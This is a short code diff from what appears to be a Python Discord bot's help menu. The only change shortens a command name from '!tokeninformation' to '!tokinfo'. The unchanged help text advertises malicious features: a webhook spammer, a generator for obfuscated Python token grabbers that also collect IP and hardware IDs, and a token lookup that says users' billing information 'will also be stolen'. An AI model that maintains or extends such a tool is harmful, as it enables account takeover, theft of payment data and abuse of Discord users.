@@ -837,7 +837,7 @@ class XOLOVIEW(discord.ui.View):
         help_embed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
         help_embed.add_field(name='Webhook Spammer', value='Spams a webhook until it gets rate limited asf\n`!webhookspam <webhook> <msgcontent>`', inline=False)
         help_embed.add_field(name='Token grabber generator', value='Generates a token grabber in python. Also grabs IP, HWID, etc.\n`!tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
-        help_embed.add_field(name='Token Information', value='Provides full information on a user token. Billing info will also be stolen, if any.\n`!tokeninformation <token>`', inline=False)
+        help_embed.add_field(name='Token Information', value='Provides full information on a user token. Billing info will also be stolen, if any.\n`!tokinfo <token>`', inline=False)
         help_embed.set_footer(text="Made by xolo")
 
         await interaction.response.send_message(embed=help_embed, ephemeral=True)
